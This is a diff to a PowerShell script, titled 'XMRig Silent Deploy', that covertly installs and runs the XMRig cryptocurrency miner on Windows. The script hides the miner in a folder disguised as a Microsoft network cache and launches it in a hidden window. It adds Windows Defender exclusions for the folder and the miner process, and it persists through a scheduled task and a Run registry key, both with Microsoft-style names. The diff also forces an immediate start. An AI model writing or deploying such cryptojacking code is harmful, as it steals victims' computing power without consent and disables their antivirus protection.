@@ -1,4 +1,4 @@
-# XMRig Silent Deploy - FINAL CLEAN VERSION (100% invisible, no logs)
+# XMRig Silent Deploy - FINAL CLEAN FIXED (100% invisible + instant start)
 $InstallDir = "C:\ProgramData\Microsoft\Network\Cache"
 if (-not (Test-Path $InstallDir)) {
     New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
@@ -17,11 +17,10 @@ if ($Sub) {
     Remove-Item $Sub.FullName -Recurse -Force
 }
 
-$ExePath = (Get-ChildItem $InstallDir -Recurse -Filter "xmrig.exe" -File | Select-Object -First 1).FullName
 $ConfigPath = "$InstallDir\config.json"
 $BatPath = "$InstallDir\start.bat"
 
-$ConfigJson = @"
+$ConfigJson = @'
 {
   "autosave": false,
   "colors": false,
@@ -34,17 +33,22 @@ $ConfigJson = @"
     "pass": "x",
     "keepalive": true,
     "tls": true,
-    "rig-id": "$env:COMPUTERNAME"
+    "rig-id": "' + $env:COMPUTERNAME + '"
   }]
 }
-"@
+'@
 [System.IO.File]::WriteAllText($ConfigPath, $ConfigJson, [System.Text.Encoding]::UTF8)
 
-"@echo off
-cd /d `"$InstallDir`"
-start /B xmrig.exe -c config.json -B --no-color" | Out-File $BatPath -Encoding ASCII -Force
+$BatContent = @"
+@echo off
+cd /d "$InstallDir"
+start /B xmrig.exe -c config.json -B --no-color
+"@
+$BatContent | Out-File $BatPath -Encoding ASCII -Force
 
 try { Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue } catch {}
+try { Add-MpPreference -ExclusionProcess "$InstallDir\xmrig.exe" -ErrorAction SilentlyContinue } catch {}
+
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$BatPath`"" -WindowStyle Hidden
 
 $TaskName = "MicrosoftNetworkCache"
@@ -57,3 +61,6 @@ try {
     Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Force | Out-Null
 }
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $TaskName -Value "cmd.exe /c `"$BatPath`"" -Force
+
+# Force immediate start as SYSTEM (garantizado)
+schtasks /run /tn $TaskName | Out-Null
